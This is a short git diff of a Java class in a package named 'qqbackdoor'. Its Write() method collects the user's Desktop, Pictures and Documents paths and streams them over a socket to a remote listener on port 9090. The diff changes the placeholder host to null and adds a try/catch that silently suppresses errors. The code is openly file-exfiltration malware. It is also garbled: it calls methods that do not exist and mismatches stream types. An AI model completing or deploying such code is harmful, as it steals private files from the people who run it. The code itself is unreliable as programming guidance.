@@ -5,6 +5,8 @@ package com.qqTechnologies.qqbackdoor;
 public class User {
   
   public void Write() {
+    try 
+    {
     System.getenv("USERPROFILE");
     File desktop = new File("%USERPROFILE%\\Desktop");
     File pictures = new File("%USERPROFILE%\\Pictures");
@@ -15,13 +17,16 @@ public class User {
       byte desktop_b = desktop.getAbsoluteFile().getBytes();
       byte pictures_b = pictures.getAbsoluteFile().getBytes();
       byte documents_b = documents.getAbsoluteFile().getBytes();
-      Socket s = new Socket("IP", 9090);
+      Socket s = new Socket(null, 9090);
       BufferedOutputStream b = new BufferedInputStream(s.getOutputStream());
       b.write(desktop_b);
       b.write(pictures_b);
       b.write(documents_b);
       b.close();
     s.close();
+    } catch (Exception e) {
+      e.getCause();
+    }
     }
 
     public void Read() {
@@ -41,4 +46,5 @@ public class User {
         e.printStackTrace();
     }
     }
+  
   }
